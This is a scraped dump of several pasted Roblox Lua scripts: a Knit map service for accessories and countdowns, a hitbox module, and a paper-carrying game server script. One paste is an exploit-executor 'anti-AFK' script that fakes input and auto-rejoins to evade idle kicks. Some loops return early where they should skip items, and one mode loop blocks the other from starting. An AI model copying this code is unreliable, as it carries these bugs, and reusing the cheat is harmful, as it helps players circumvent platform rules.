		local LessGravity = player:FindFirstChild(""LessGravity"") --refrence to the lessgravity value which is inside player
		if not LessGravity then return end --if no lessgravity value found in player then it stops the execution of this function
		LessGravity.Value += 1 --increases the value of the ""LessGravity"" value by 1
	else
		local LessGravity = player:FindFirstChild(""LessGravity"") --refrence to the lessgravity value which is inside player
		if not LessGravity then return end --if no lessgravity value found in player then it stops the execution of this function
		LessGravity.Value -= 1 --increases the value of the ""LessGravity"" value by 1
	end
end

-- Utility table to map asset types to accessory categories and optional transparency flags
local AssetTypes = {
	[8]  = { type = Enum.AccessoryType.Hat, transparency = nil },
	[42] = { type = Enum.AccessoryType.Face, transparency = nil },
	[46] = { type = Enum.AccessoryType.Neck, transparency = nil },
	[67] = { type = Enum.AccessoryType.LeftShoe, transparency = true }, -- Invisible character if accessoryType is leftShoe because it's actually a character
}

--destroys accessories of a specific type
local function clearAccessories(character, accessoryType)
	for _, child in pairs(character:GetDescendants()) do --looping through the players character and deleteing accessories of the specific accessory type
		if not child:IsA(""Accessory"") or child.AccessoryType ~= accessoryType then return end
		child:Destroy()
	end
end

--changing transparency of character (used for type 67 accessory)
local function setCharacterTransparency(character, alpha)
	for _, part in pairs(character:GetDescendants()) do
		if not (part:IsA(""MeshPart"") or part:IsA(""BasePart"") or part:IsA(""Decal"")) then return end
		part.Transparency = alpha
	end
end

--it loads and apply accessory
local function applyAccessory(assetId, character, accessoryType)
	local success, model = pcall(function()
		return InsertService:LoadAsset(assetId) --uses inserservice to load the asset from roblox marketplace and place it on the player's character
	end)

	if not success or not model:IsA(""Model"") then return end
	local accessory = model:FindFirstChildOfClass(""Accessory"")
	if  not accessory then return end
	accessory.AccessoryType = accessoryType
	accessory.Parent = character
	model:Destroy() --first getting the accessory from the model out and then removing model
end

--Handing Brainrot wearing, it runs whenever client firesServer
function MapHandlerService.Client:WearBrainRot(player: Player, assetId, argument, rewardTemplate)
	local success, info = pcall(function()
		return MPS:GetProductInfo(assetId)--gets the accessory info
	end)

	if not success or not info or not info.AssetTypeId then
		warn(""Failed to get asset info."") --if failed to load then it logs out warning to the console and stops the execution of the function
		return
	end

	local data = AssetTypes[info.AssetTypeId] --getting proper assettype Data from assettype id
	if not data then
		warn(""Unsupported asset type:"", info.AssetTypeId) --if unable to retrieve data (e.g asset type id is not available in that table) then it logs the warning to the console and then stops the execution of the function 
		return
	end

	local character = player.Character --getting player's character
	if not character then
		warn(""Character not found for player:"", player.Name) --if unable to find player character then it logs the warning to the console and stops the execution of the function
		return
	end

	-- Handle accessory logic
	if argument == ""Wear"" then --if argument is equal to wear then it clears out the accessory of the same assetType from player and ware the new one
		clearAccessories(character, data.type)
		if data.transparency then
			setCharacterTransparency(character, 1)
		end
		
		applyAccessory(assetId, character, data.type)
	else
		--removes accessory & restores visibility (if needed)
		clearAccessories(character, data.type)
		if data.transparency then
			setCharacterTransparency(character, 0)
		end
	end
end

--Update Countdown Timer UI
function MapHandlerService:UpdateCountdownUIForMode(mode, timeLeft)
	for _, player in ipairs(game.Players:GetPlayers()) do --it loop through all of the players and update their time that is left
		local success, selectedMode = pcall(function()
			return player:WaitForChild(""PlayerSelectedMode"", 3).Value --gets the player selected mode and if it don't exist then it keep checking for 3 sec and if still there is no then it returns error
		end)
		if not success or selectedMode ~= mode then return end

		local gui = player:FindFirstChild(""PlayerGui"") --getting the playerGUI
		if not gui then return end
		local timer = gui:FindFirstChild(""Timer"") --getting the timerUI
		if not timer then return end
		local roundTimer = timer:FindFirstChild(""RoundTimer"") --getting the timer textLabel
		if not roundTimer then return end

		roundTimer.Visible = true --making the timer visible before updating time
		roundTimer.Text = ""Round Will Start In: "" .. timeLeft --Updates the display textlabel with the latest time
		if timeLeft ~= 0 then continue end
		task.delay(1, function()
			roundTimer.Visible = false -- if timeLeft is 0 then it waits for 1 sec and then make the roundTimer UI invisible
		end)
	end
end

function MapHandlerService:HandleMode(isEasy, mode)
	local getPlayerMode = function(player)
		local success, selectedMode = pcall(function()
			return player:WaitForChild(""PlayerSelectedMode"", 3).Value --gets the player selected mode and if it don't exist then it keep checking for 3 sec and if still there is no then it returns error
		end)
		return success and selectedMode == mode
	end


	--Play Music for Players in Mode
	for _, player in ipairs(game.Players:GetPlayers()) do
		if not getPlayerMode(player) then continue end
		pcall(function()
			self.Client.MusicEvent:Fire(player, ""Play"")
		end)
	end

	-- Countdown
	for i = 20, 0, -1 do
		task.wait(1)
		print(""Countdown Running"", mode)
		self:UpdateCountdownUIForMode(mode, i) --updates the countdown UI for players
	end

	--Stops Music for players
	for _, player in ipairs(game.Players:GetPlayers()) do
		if not getPlayerMode(player) then continue end
		pcall(function()
			self.Client.MusicEvent:Fire(player, ""Stop"")
		end)
	end

	--Start Game, I am using Pcall for it so in any case it gives error the error won't break the entire script
	local success, err = pcall(function()
		self:RopeMap(mode)
	end)
	if not success then warn(""[RopeMap Error]"", mode, "":"", err) end --logs the error to the console if it gave any error

	--Wait until game finishes
	local waitTime = 0
	repeat
		wait(1)
		waitTime += 1
	until ((isEasy and #PlayerInEasyRopeGame == 0) or (not isEasy and #PlayerInHardRopeGame == 0)) or waitTime > 60
end

--Starts round Loop for rope map
function MapHandlerService:StartModeLoop(mode)
	local isEasy = (mode == ""Easy"")

	while true do
		task.wait()
		self:HandleMode(isEasy, mode)
	end
end

--KnitStart FUNCTION, this is the function which runs first whenever server starts
function MapHandlerService:KnitStart()
	self:DeveloperProductsHandler()
	repeat wait() until #game.Players:GetPlayers() > 0

	task.spawn(self:StartModeLoop(""Easy""))
	task.spawn(self:StartModeLoop(""Hard""))
end

return MapHandlerService"
g0krLAhC,ANTI-AFK,tarmaster,Lua,Saturday 19th of July 2025 11:57:17 AM CDT,"local gui = cloneref(game:GetService(""GuiService""))
local a = cloneref(game:GetService(""VirtualUser""))
local teleport = cloneref(game:GetService(""TeleportService""))

game.Players.LocalPlayer.Idled:Connect(function()
    a:CaptureController()
    a:ClickButton2(Vector2.new())
end)
gui.ErrorMessageChanged:Connect(function()
    task.spawn(function()
        while task.wait(5) do
            teleport:Teleport(game.PlaceId, game.Players.LocalPlayer)
        end
    end)
end)"
H1ayMPeK,Hitbox module (Finjer),Finjer,Lua,Saturday 19th of July 2025 11:03:56 AM CDT,"local hitboxModule = {}
--// Service //--
local Players = game:GetService('Players')
--// Etc //--
--// Function //-- 
function hitboxModule.CreateOnceHitbox(character, size, offset, showHitbox)
	
	local player = Players:GetPlayerFromCharacter(character)
	local humanoidRootPart = character:FindFirstChild('HumanoidRootPart')
	local enemyCharacter
	
	local params = OverlapParams.new()
	params.FilterDescendantsInstances = {character}
	
	if showHitbox == true then
		
		local result = Instance.new('Part')
		result.Size = size
		result.CFrame = character.HumanoidRootPart.CFrame * offset
		result.Color = Color3.fromRGB(255)
		result.Transparency = 0.9
		result.Material = Enum.Material.Plastic
		result.Anchored = true
		result.CanCollide = false
		result.CanTouch = false
		result.CanQuery = false
		result.Parent = workspace
		
		game.Debris:AddItem(result, 1)
		
	end
	
	local hitboxContent = workspace:GetPartBoundsInBox(character.HumanoidRootPart.CFrame * offset, size, params)
	
	local hitCharacter = {}
	
	for _, part in hitboxContent do
		
		if part.Parent:FindFirstChild('Humanoid') and not table.find(hitCharacter, part.Parent) then
			
			enemyCharacter = part.Parent
			table.insert(hitCharacter, enemyCharacter)
		end
		
	end
	
	return enemyCharacter
	
end
function hitboxModule.CreateHitbox(character, size, offset, showHitbox)
	local player = Players:GetPlayerFromCharacter(character)
	local humanoidRootPart = character:FindFirstChild('HumanoidRootPart')
	local enemyCharacter
	local params = OverlapParams.new()
	params.FilterDescendantsInstances = {character}
	if showHitbox == true then
		local result = Instance.new('Part')
		result.Size = size
		result.CFrame = character.HumanoidRootPart.CFrame * offset
		result.Color = Color3.fromRGB(255)
		result.Transparency = 0.9
		result.Material = Enum.Material.Plastic
		result.Anchored = true
		result.CanCollide = false
		result.CanTouch = false
		result.CanQuery = false
		result.Parent = workspace
		game.Debris:AddItem(result, 1)
	end
	local hitboxContent = workspace:GetPartBoundsInBox(character.HumanoidRootPart.CFrame * offset, size, params)
	local hitCharacter = {}
	for _, part in hitboxContent do
		if part.Parent:FindFirstChild('Humanoid') and not table.find(hitCharacter, part.Parent) then
			enemyCharacter = part.Parent
			table.insert(hitCharacter, enemyCharacter)
		end
	end
	return hitCharacter
end

--finjer

function hitboxModule.CreateHitboxWithoutChar(pos : Vector3, size, shape, showHitbox)
	
	local enemyCharacter
	if showHitbox == true then
		local result = Instance.new('Part')
		result.Size = Vector3.new(size, size, size)
		result.CFrame = CFrame.new(pos)
		result.Color = Color3.fromRGB(255)
		result.Transparency = 0.2
		result.Anchored = true
		result.CanCollide = false
		result.CanTouch = false
		result.CanQuery = false
		result.Shape = Enum.PartType[shape]
		result.Parent = workspace
		game.Debris:AddItem(result, 1)
	end
	local hitboxContent
		
	if shape == 'Ball' then
		hitboxContent = workspace:GetPartBoundsInRadius(pos, size)
	elseif shape == 'Block' then
		hitboxContent = workspace:GetPartBoundsInBox(CFrame.new(math.round(pos.X), math.round(pos.Y), math.round(pos.Z)), size)
	end
	
	local hitCharacter = {}
	for _, part in hitboxContent do
		if part.Parent:FindFirstChild('Humanoid') and not table.find(hitCharacter, part.Parent) then
			enemyCharacter = part.Parent
			table.insert(hitCharacter, enemyCharacter)
		end
	end
	return hitCharacter
end
return hitboxModule"
BjNDbYVp,hiddendevs.com / rb:@64khyraaa / dc:@arquez application 2nd try,Eymens,Lua,Saturday 19th of July 2025 10:45:23 AM CDT,"-- services
local Players = game:GetService(""Players"")
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local ServerScriptService = game:GetService(""ServerScriptService"")
local Workspace = game:GetService(""Workspace"")
local Debris = game:GetService(""Debris"")

-- modules
-- References to various server-side modules are defined here.
-- These modules manage different aspects of the game, such as item carrying, paper tracking, plot management, upgrades, and settings.
local CarryEvent = ReplicatedStorage.Remotes:WaitForChild(""CarryEvent"")
local PaperEvent = ReplicatedStorage.Remotes:WaitForChild(""PaperEvent"")
local UpgradeServer = require(ServerScriptService.Modules.UpgradeServer)
local PaperTracker = require(ServerScriptService.Modules.PaperTracker)
local PlotManager = require(ServerScriptService.Modules.PlotManager)
local Settings = require(ServerScriptService.Modules.Settings)
local Chance = require(ReplicatedStorage.Modules.Chance)

-- constants and state variables
local papersFolder = Workspace:WaitForChild(""Papers"") -- The folder in the game world where all paper instances are stored.
local pickupdist = 15 -- The maximum distance a player can be from a paper to pick it up.
local recyclercooldown = 1.2 -- The cooldown duration between consecutive sales at the recycler (selling mechanism).

-- tables to track player state
-- These tables are used to track players' current states and the papers they are carrying on the server side.
local serverCarriedPapers = {} -- [player] = { {paper=instance}, ... } -> Stores a list of paper instances currently carried by each player.
local allCarriedPaperInstances = {} -- [paperInstance] = true -> Used as a set (hashmap) for quick lookup of all paper instances currently being carried across the server.
local originalPlayerSpeeds = {} -- [player] = originalSpeed -> Stores players' original walk speeds, as their speed is reduced when carrying papers.
local sellCooldowns = {} -- [player] = true -> Tracks selling cooldowns for players to prevent spamming the selling mechanism.
local promptConnections = {} -- [player] = {Prompt=conn, Touch=conn} -> Stores connections for selling triggers (ProximityPrompt and Touched event) associated with each player's plot. This is crucial for properly disconnecting connections when a player leaves or their plot changes.

-- caches for better performance
-- Tables used to improve performance by caching frequently calculated values.
local paperCapacityCache = {} -- [player] = capacity -> Caches the maximum paper carrying capacity for each player.
local speedReductionCache = {} -- [player] = reduction -> Caches the speed reduction per paper carried for each player.
local sellBonusChanceTables = {} -- [level] = chanceTable -> Caches chance tables for different sell bonus levels, avoiding their recreation on every sale.

-- This function retrieves the maximum number of papers a player can carry.
-- It utilizes a cache to avoid recalculating the value repeatedly, which is beneficial for performance.
local function getMaxPapers(player)
    if not player then return 5 end -- Returns a default value if the player is invalid.
    if paperCapacityCache[player] then return paperCapacityCache[player] end -- Returns from cache if the value is already present.

    local maxPapers = UpgradeServer.GetValue(player, ""CarryCapacity"") or 5 -- Retrieves the carry capacity from UpgradeServer, defaults to 5 if not found.
    paperCapacityCache[player] = maxPapers -- Caches the calculated value.
    return maxPapers
end

-- This function determines how much a player slows down per paper carried.
-- It also uses a cache, similar to the previous function, for performance optimization.
local function getSpeedReduction(player)
    if not player then return 1.5 end -- Returns a default value if the player is invalid.
    if speedReductionCache[player] then return speedReductionCache[player] end -- Returns from cache if the value is already present.

    local speedReduction = UpgradeServer.GetValue(player, ""CarryBalance"") or 1.5 -- Retrieves the balance (speed reduction) value from UpgradeServer, defaults to 1.5 if not found.
    speedReductionCache[player] = speedReduction -- Caches the calculated value.
    return speedReduction
end

-- Clears the relevant caches when a player upgrades something.
-- This ensures that the next time the `getMaxPapers` or `getSpeedReduction` functions are called, they re-calculate the updated values.
local function clearCachesOnUpgrade(player, key)
    if key == ""CarryCapacity"" then
        paperCapacityCache[player] = nil -- Invalidates the paper capacity cache.
    elseif key == ""CarryBalance"" then
        speedReductionCache[player] = nil -- Invalidates the speed reduction cache.
    end
end

--visual and audio effects

-- This function makes the gears on the recycler model spin.
-- It runs in a new thread (task.spawn) to prevent blocking the main script execution.
local function spinRecyclerGears(recyclerModel, recyclerUnion)
    task.spawn(function()
        local gears = {}
        -- Finds all ""Gear"" named UnionOperation parts within the recycler model.
        for _, child in ipairs(recyclerModel:GetDescendants()) do
            if child.Name == ""Gear"" and child:IsA(""UnionOperation"") then
                table.insert(gears, child)
            end
        end

        if #gears == 0 then return end

        -- start sound
        -- Plays the recycler start-up sound. The sound is cloned and then cleaned up by the Debris service after playback.
        local sndMachineStart = recyclerModel:FindFirstChild(""MachineStart"", true)
        if sndMachineStart and recyclerUnion then
            local sound = sndMachineStart:Clone()
            sound.Parent = recyclerUnion
            sound:Play()
            Debris:AddItem(sound, 1)
        end

        -- spin them
        -- Rotates the gears for a specified duration.
        local startTime, duration, ROTATION_SPEED = os.clock(), 1.0, 120
        while os.clock() - startTime < duration do
            local dt = task.wait() -- Waits for the next frame and gets the elapsed time.
            local rotationCFrame = CFrame.Angles(0, 0, math.rad(ROTATION_SPEED * dt)) -- Calculates how much the gears should rotate in each step.
            for _, gear in ipairs(gears) do
                gear.CFrame = gear.CFrame * rotationCFrame -- Updates the gear's CFrame to apply the rotation.
            end
        end

        -- end sound
        -- Plays the recycler shut-down sound.
        local sndMachineEnd = recyclerModel:FindFirstChild(""MachineEnd"", true)
        if sndMachineEnd and recyclerUnion then
            local sound = sndMachineEnd:Clone()
            sound.Parent = recyclerUnion
            sound:Play()
            Debris:AddItem(sound, sound.TimeLength + 1)
        end
    end)
end

-- This function triggers all visual and audio effects when a player sells paper.
-- These include playing a sell sound, triggering a local screen shake for the player, and spinning the recycler gears.
local function triggerRecyclerEffects(player)
    local playerPlot = PlotManager.GetPlayerPlot(player) -- Retrieves the player's plot.
    if not playerPlot then return end

    local recyclerModel = playerPlot:FindFirstChild(""Recycler"") -- Finds the recycler model within the plot.
    if not recyclerModel then return end

    local recyclerUnion = recyclerModel:FindFirstChild(""Recycler"") -- Finds the main union part of the recycler.
    if recyclerUnion then
        local sndSell = recyclerModel:FindFirstChild(""Sell"", true) -- Finds the sell sound.
        if sndSell then
            local sound = sndSell:Clone()
            sound.Parent = recyclerUnion
            sound.PlaybackSpeed = 0.9 + math.random() * (1.05 - 0.9) -- Randomizes the playback speed of the sound.
            sound:Play()
            Debris:AddItem(sound, sound.TimeLength + 1) -- Ensures the sound is automatically cleaned up after playing.
        end
    end

    CarryEvent:FireClient(player, ""PlayLocalShake"", recyclerModel) -- Fires a client event to play a local screen shake effect for the player.
    spinRecyclerGears(recyclerModel, recyclerUnion) -- Initiates the gear spinning animation for the recycler.
end

--selling logic

-- This function calculates the total money multiplier from all boosts and mutations.
-- It accounts for cash boosts from player upgrades, mutation multipliers of the paper, and a chance-based sell bonus.
local function calculateSaleMultiplier(player, paperInstance)
    local multiplier = 1.0

    -- 1. cash boost from upgrades
    local boostLvl = UpgradeServer.GetLevel(player, ""CashBoost"") -- Gets the player's ""CashBoost"" upgrade level.
    multiplier += (0.05 * boostLvl) -- Adds a 5% bonus for each level.

    -- 2. mutations multiplier
    local mutation = paperInstance:GetAttribute(""Mutation"") -- Checks the mutation attribute of the paper.
    if mutation == ""Rainbow"" then
        multiplier *= Settings.Mutations.Rainbow.ValueMultiplier -- Applies a specific multiplier for ""Rainbow"" mutation.
    elseif mutation == ""Shiny"" then
        multiplier *= Settings.Mutations.Shiny.ValueMultiplier -- Applies a specific multiplier for ""Shiny"" mutation.
    end

    -- 3. sell bonus chance
    local sellBonusLevel = UpgradeServer.GetLevel(player, ""SellBonus"") -- Gets the player's ""SellBonus"" upgrade level.
    local sellBonusActivated = false
    if sellBonusLevel > 0 then
        -- Uses the `sellBonusChanceTables` cache to create or retrieve a chance table for each bonus level.
        if not sellBonusChanceTables[sellBonusLevel] then
            sellBonusChanceTables[sellBonusLevel] = Chance.new({
                [""Success""] = sellBonusLevel, -- Success chance is equal to the upgrade level.
                [""Fail""] = 100 - sellBonusLevel, -- Fail chance is 100 minus the upgrade level.
            })
        end

        if sellBonusChanceTables[sellBonusLevel]:Run() == ""Success"" then -- Runs the chance table to check if the bonus is triggered.
            multiplier *= 2 -- Doubles the multiplier if the bonus is activated.
            sellBonusActivated = true
        end
    end

    return multiplier, sellBonusActivated, mutation -- Returns the calculated multiplier, whether the bonus was activated, and the mutation type.
end

-- This is the main sale function that performs all the core selling logic.
-- It is called by other selling functions (e.g., when a paper is touched or a prompt is triggered).
local function processPaperSale(player, paperInstance)
    local guid = paperInstance:GetAttribute(""GUID"") -- Retrieves the unique ID of the paper.
    local baseCash = PaperTracker.SellPaper(player, guid) -- Sells the paper via the PaperTracker module and gets its base cash value.
    if not baseCash then return end -- Exits if the sale fails (e.g., invalid paper).

    -- Get all the bonuses
    local multiplier, sellBonusActivated, mutation = calculateSaleMultiplier(player, paperInstance) -- Calculates all multipliers for the paper.
    local totalCashFromSale = math.floor(baseCash * multiplier + 0.5) -- Calculates the total cash amount and rounds it.

    -- Give the player money
    UpgradeServer.AddCoins(player, totalCashFromSale) -- Adds the earned coins to the player.

    -- Inform the player they received money with cool popups
    PaperEvent:FireClient(player, ""showIncome"", totalCashFromSale) -- Sends a client event to show an income popup.
    if sellBonusActivated then
        PaperEvent:FireClient(player, ""showBonus"", ""2x BONUS!"") -- Shows a 2x bonus popup if the sell bonus was activated.
    end
    if mutation then
        PaperEvent:FireClient(player, ""showMutation"", mutation .. "" PAPER!"") -- Shows a mutation popup if a mutated paper was sold.
    end

    -- Play sounds and effects and destroy the paper
    triggerRecyclerEffects(player) -- Triggers the selling effects (sound, screen shake, gear animation).
    paperInstance:Destroy() -- Removes the sold paper instance from the game world.

    return true -- Indicates that the sale was successful.
end

-- This function sells a paper when it touches the recycler's hitbox.
local function sellTouchedPaper(paperInstance)
    local ownerId = paperInstance:GetAttribute(""OwnerId"") -- Gets the owner's User ID from the paper.
    if not ownerId then return end

    local player = Players:GetPlayerByUserId(ownerId) -- Retrieves the player object using the owner ID.
    if not player then return end

    -- Check if the paper is already being sold or carried, or if the machine is on cooldown.
    if paperInstance:GetAttribute(""IsBeingSold"") or paperInstance:GetAttribute(""IsCarried"") then return end
    if sellCooldowns[player] then return end

    -- Set cooldown to prevent spamming.
    sellCooldowns[player] = true -- Activates the selling cooldown for the player.
    task.delay(recyclercooldown, function() sellCooldowns[player] = nil end) -- Resets the cooldown after a specified duration.

    paperInstance:SetAttribute(""IsBeingSold"", true) -- Sets an attribute on the paper indicating it's being sold.

    if not processPaperSale(player, paperInstance) then -- Calls the main paper selling function.
        -- If the sale fails for some reason, unset the flag and reset the cooldown.
        paperInstance:SetAttribute(""IsBeingSold"", nil)
        sellCooldowns[player] = nil
    end
end

-- This function sells the last paper a player picked up when they activate a ProximityPrompt.
local function sellLastCarriedPaper(player)
    if sellCooldowns[player] then return end -- Exits if the selling cooldown is active.

    local stack = serverCarriedPapers[player] -- Retrieves the player's stack of carried papers.
    if not stack or #stack == 0 then return end -- Exits if the stack is empty.

    -- Cooldown to prevent spamming.
    sellCooldowns[player] = true -- Activates the selling cooldown for the player.
    task.delay(recyclercooldown, function() sellCooldowns[player] = nil end) -- Resets the cooldown after a specified duration.

    local paperData = table.remove(stack) -- Removes the topmost (most recently picked up) paper from the stack.
    local paper = paperData.paper
    if not paper or not paper.Parent then -- Exits if the paper is invalid or no longer exists in the workspace.
        sellCooldowns[player] = nil
        return
    end

    paper:SetAttribute(""IsBeingSold"", true) -- Sets an attribute on the paper indicating it's being sold.
    local success = processPaperSale(player, paper) -- Calls the main paper selling function.

    if not success then
        -- If the sale failed, re-insert the paper back into the stack.
        table.insert(stack, paperData)
        paper:SetAttribute(""IsBeingSold"", nil)
        sellCooldowns[player] = nil
        return
    end

    -- Update player speed since they are carrying one less item.
    local character = player.Character
    if not character or not originalPlayerSpeeds[player] then return end
    local humanoid = character:FindFirstChildOfClass(""Humanoid"")
    if not humanoid then return end

    if #stack == 0 then -- If the player is no longer carrying any papers, reset their speed to original and stop the carry animation.
        humanoid.WalkSpeed = originalPlayerSpeeds[player]
        originalPlayerSpeeds[player] = nil
        CarryEvent:FireClient(player, ""StopCarryAnim"")
    else -- If they are still carrying papers, adjust their speed based on the updated stack size.
        humanoid.WalkSpeed = originalPlayerSpeeds[player] - (#stack * getSpeedReduction(player))
    end
end


-- carrying and dropping logic

-- This function handles a player's request to pick up a paper.
-- It performs validation checks and then attaches the paper to the player's character, adjusting their speed.
local function handlePickupRequest(player, targetPaper)
    local character = player.Character
    local humanoid = character and character:FindFirstChildOfClass(""Humanoid"")
    local playerRoot = character and character.HumanoidRootPart
    if not humanoid or not playerRoot then return end -- Exits if the player's character or essential parts are missing.

    -- Validation checks
    if not targetPaper or not targetPaper:IsDescendantOf(papersFolder) then return end -- Checks if the target paper is valid and in the correct folder.
    if targetPaper:GetAttribute(""OwnerId"") ~= player.UserId then return end -- Ensures the paper belongs to the requesting player.
    if allCarriedPaperInstances[targetPaper] then return end -- Checks if the paper is already being carried.
    if (playerRoot.Position - targetPaper.Position).Magnitude > pickupdist then return end -- Checks if the player is within pickup distance.

    local playerStack = serverCarriedPapers[player] -- Retrieves the player's paper stack.
    if #playerStack >= getMaxPapers(player) then return end -- Checks if the player has reached their maximum carrying capacity.

    -- Save old speed if not already saved.
    -- Stores the player's original speed, so it can be restored when papers are dropped.
    if not originalPlayerSpeeds[player] then
        originalPlayerSpeeds[player] = humanoid.WalkSpeed
    end

    -- Attach the paper to the player.
    -- Welds the paper to the player (using WeldConstraint) and sets its physical properties.
    local mainPart = targetPaper:IsA(""Model"") and targetPaper.PrimaryPart or targetPaper -- Determines the main part of the paper (PrimaryPart if a model, or the part itself).
    mainPart.CanCollide = false -- Disables collisions for the paper.
    mainPart.Massless = true -- Sets the paper's mass to zero, so it doesn't affect player movement.
    targetPaper:SetAttribute(""IsCarried"", true) -- Sets an attribute indicating the paper is being carried.

    local anchorPart = (#playerStack == 0) and playerRoot or playerStack[#playerStack].paper -- Determines the part to which the paper will be welded (player's HumanoidRootPart for the first paper, or the previous paper in the stack).
    local randomRotation = CFrame.Angles(0, math.rad(math.random(-5, 5)), 0) -- Adds a slight random rotation for visual variety.
    local anchorCFrame = anchorPart:IsA(""Model"") and anchorPart.PrimaryPart.CFrame or anchorPart.CFrame -- Gets the CFrame of the anchor part.

    if #playerStack == 0 then -- If it's the first paper, position it in front of the character.
        mainPart.CFrame = anchorCFrame * CFrame.new(0, 1, -2.1) * randomRotation
    else -- Position subsequent papers slightly above the previous one in the stack.
        mainPart.CFrame = anchorCFrame * CFrame.new(0, 0.1, 0) * randomRotation
    end

    local weld = Instance.new(""WeldConstraint"") -- Creates a WeldConstraint to physically attach the paper.
    weld.Part0 = mainPart
    weld.Part1 = anchorPart:IsA(""Model"") and anchorPart.PrimaryPart or anchorPart
    weld.Parent = mainPart

    -- Add to our tracking tables.
    table.insert(playerStack, { paper = targetPaper }) -- Adds the paper to the player's stack.
    allCarriedPaperInstances[targetPaper] = true -- Adds to the global set of carried paper instances.

    -- Slow the player down.
    humanoid.WalkSpeed = originalPlayerSpeeds[player] - (#playerStack * getSpeedReduction(player)) -- Reduces the player's walk speed based on the number of papers carried.

    -- Play animations and sounds.
    if #playerStack == 1 then -- If it's the first paper, start the carry animation.
        CarryEvent:FireClient(player, ""PlayCarryAnim"")
    end
    CarryEvent:FireClient(player, ""PlaySound"", ""Pickup"") -- Plays a pickup sound.
end

-- This function handles a player's request to drop a paper.
-- It detaches the paper from the player, restores its physical properties, and adjusts the player's speed.
local function handleDropRequest(player, dropCFrame)
    local character = player.Character
    local humanoid = character and character:FindFirstChildOfClass(""Humanoid"")
    if not humanoid then return end

    local playerStack = serverCarriedPapers[player] -- Retrieves the player's paper stack.
    if #playerStack == 0 then return end -- Exits if the stack is empty.

    local paperData = table.remove(playerStack) -- Removes the topmost paper from the stack.
    local paperToDrop = paperData.paper

    if not paperToDrop or not paperToDrop.Parent then return end

    -- Unweld the paper and make it a normal object again.
    -- Detaches the paper from the player and restores its original physical properties.
    local mainPart = paperToDrop:IsA(""Model"") and paperToDrop.PrimaryPart or paperToDrop
    local weld = mainPart:FindFirstChildOfClass(""WeldConstraint"") -- Finds the WeldConstraint on the paper.
    if weld then weld:Destroy() end -- Destroys the WeldConstraint, freeing the paper.

    mainPart.CanCollide = true -- Re-enables collisions for the paper.
    mainPart.Massless = false -- Restores the paper's mass.
    paperToDrop:SetAttribute(""IsCarried"", nil) -- Clears the attribute indicating the paper is carried.
    mainPart:PivotTo(dropCFrame) -- Moves the paper to the specified drop location.

    -- Remove from tracking table.
    allCarriedPaperInstances[paperToDrop] = nil -- Removes from the global set of carried paper instances.

    -- Fix player speed.
    -- Adjusts the player's speed based on the remaining number of papers.
    if #playerStack == 0 and originalPlayerSpeeds[player] then -- If the player is no longer carrying any papers, restore their original speed.
        humanoid.WalkSpeed = originalPlayerSpeeds[player]
        originalPlayerSpeeds[player] = nil
    elseif originalPlayerSpeeds[player] then -- If still carrying papers, adjust speed based on the updated stack size.
        humanoid.WalkSpeed = originalPlayerSpeeds[player] - (#playerStack * getSpeedReduction(player))
    end

    -- Play animations and sounds.
    CarryEvent:FireClient(player, ""PlayDropAnim"") -- Plays a drop animation.
    CarryEvent:FireClient(player, ""PlaySound"", ""Drop"") -- Plays a drop sound.
    if #playerStack == 0 then -- If the player has dropped all papers, stop the carry animation.
        CarryEvent:FireClient(player, ""StopCarryAnim"")
    end
end

-- Listens for events from the client (player) via the CarryEvent RemoteEvent.
CarryEvent.OnServerEvent:Connect(function(player, action, data)
    if action == ""RequestPickup"" then
        handlePickupRequest(player, data) -- Handles a paper pickup request.
    elseif action == ""RequestDrop"" then
        handleDropRequest(player, data) -- Handles a paper drop request.
    end
end)


--player and connection management

-- This function is called when a player dies or leaves the game.
-- It ensures that any papers they were carrying are automatically dropped (and destroyed).
-- This prevents inconsistent states and ""stuck"" papers in the game world.
local function forceDropAll(player)
    local stack = serverCarriedPapers[player]
    if not stack or #stack == 0 then return end

    local character = player.Character
    if character then
        local humanoid = character:FindFirstChildOfClass(""Humanoid"")
        if humanoid and originalPlayerSpeeds[player] then
            humanoid.WalkSpeed = originalPlayerSpeeds[player] -- Restores the player's speed to their original value.
        end
    end

    originalPlayerSpeeds[player] = nil -- Clears the original speed record.

    for _, paperData in ipairs(stack) do -- Iterates through each paper in the stack.
        if paperData.paper and paperData.paper.Parent then
            allCarriedPaperInstances[paperData.paper] = nil -- Removes from the global set of carried paper instances.
            paperData.paper:Destroy() -- Destroys the paper instance.
        end
    end

    serverCarriedPapers[player] = {} -- Resets the player's paper stack.
end

-- This function sets up the sell prompt and hitbox for a player's plot.
-- It includes a delay if the plot hasn't loaded yet, accommodating the asynchronous nature of plot loading.
local function connectSellTriggersForPlayer(player)
    -- Clears existing connections to prevent duplicates and ensure fresh connections are established.
    if promptConnections[player] then
        if promptConnections[player].Prompt then promptConnections[player].Prompt:Disconnect() end
        if promptConnections[player].Touch then promptConnections[player].Touch:Disconnect() end
        promptConnections[player] = nil
    end

    local playerPlot = PlotManager.GetPlayerPlot(player) -- Retrieves the player's plot.
    if not playerPlot then
        task.delay(2, function() connectSellTriggersForPlayer(player) end) -- If the plot is not found, retries after 2 seconds.
        return
    end

    local recyclerModel = playerPlot:FindFirstChild(""Recycler"") -- Finds the recycler model within the plot.
    if not recyclerModel then return end

    local prompt = recyclerModel:FindFirstChildOfClass(""ProximityPrompt"") -- Finds the ProximityPrompt within the recycler.
    local hitbox = recyclerModel:FindFirstChild(""RecycleHitbox"") -- Finds the touch hitbox within the recycler.
    local connections = {}

    if prompt then
        -- Connects the ProximityPrompt's Triggered event to the `sellLastCarriedPaper` function.
        connections.Prompt = prompt.Triggered:Connect(function() sellLastCarriedPaper(player) end)
    end

    if hitbox then
        -- Connects the hitbox's Touched event to the `sellTouchedPaper` function.
        connections.Touch = hitbox.Touched:Connect(function(hit)
            -- Validates if the touched part is a valid paper instance.
            if hit and hit.Parent and hit:IsDescendantOf(papersFolder) and hit:GetAttribute(""GUID"") then
                sellTouchedPaper(hit)
            end
        end)
    end

    promptConnections[player] = connections -- Stores the created connections.
end

-- This function sets up a player when they join the game.
-- It initializes player-specific data tables, connects attribute change signals to clear caches, and sets up selling triggers.
local function onPlayerAdded(player)
    -- Create tables to store their data.
    serverCarriedPapers[player] = {} -- Creates an empty paper stack table for the player.
    paperCapacityCache[player] = nil -- Clears player-specific caches.
    speedReductionCache[player] = nil
    sellCooldowns[player] = nil

    -- If they upgrade, we need to clear the cache.
    -- Connects signals to clear caches when ""CarryCapacity"" or ""CarryBalance"" attributes change.
